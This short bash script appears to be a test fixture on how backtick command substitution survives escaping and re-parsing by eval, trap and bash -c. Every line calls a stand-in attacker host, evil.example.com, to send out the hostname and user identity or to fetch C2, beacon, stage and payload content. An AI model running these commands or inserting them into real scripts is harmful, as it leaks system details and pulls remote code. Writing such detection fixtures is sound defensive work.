#!/bin/bash
HOSTNAME=`hostname`
RESULT=`curl http://evil.example.com/c2 -d "$HOSTNAME"`
echo "$RESULT"
echo "Beacon: `curl -s http://evil.example.com/beacon`"
# An escaped backslash leaves the backtick after it active.
STAGE="\\`curl -s http://evil.example.com/stage`"
# eval, trap, and sh -c parse their string again, so an escaped backtick pair runs there.
eval "PAYLOAD=\`curl -s http://evil.example.com/payload\`"
trap "curl -s http://evil.example.com/exit -d \`whoami\`" EXIT
bash -lc "curl -s http://evil.example.com/id -d \`id -u -n\`"
